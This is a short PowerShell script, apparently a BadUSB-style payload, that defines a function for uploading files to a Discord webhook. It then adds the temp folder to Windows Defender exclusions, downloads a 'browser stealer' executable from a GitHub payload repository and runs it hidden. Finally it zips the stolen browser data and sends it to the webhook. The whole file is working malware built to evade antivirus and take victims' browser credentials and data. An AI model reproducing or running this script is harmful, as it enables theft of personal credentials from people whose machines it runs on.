function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'YOUR-DISCORD-WEBHOOK'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}



# Add C:/ to exlusions so Windows Defender doesnt flag the exe we will download
Add-MpPreference -ExclusionPath $env:tmp

# Download the exe and save it to temp directory
iwr "https://github.com/atomiczsec/My-Payloads/blob/main/Assets/browser.exe?raw=true" -outfile "$env:tmp\browser.exe"

# Execute the Browser Stealer
cd $env:tmp;Start-Process -FilePath "$env:tmp\browser.exe" -WindowStyle h -Wait

# Exfiltrate the loot to discord
Compress-Archive -Path "$env:tmp\results" -DestinationPath $env:tmp\browserdata.zip
Upload-Discord -file "$env:tmp\browserdata.zip"
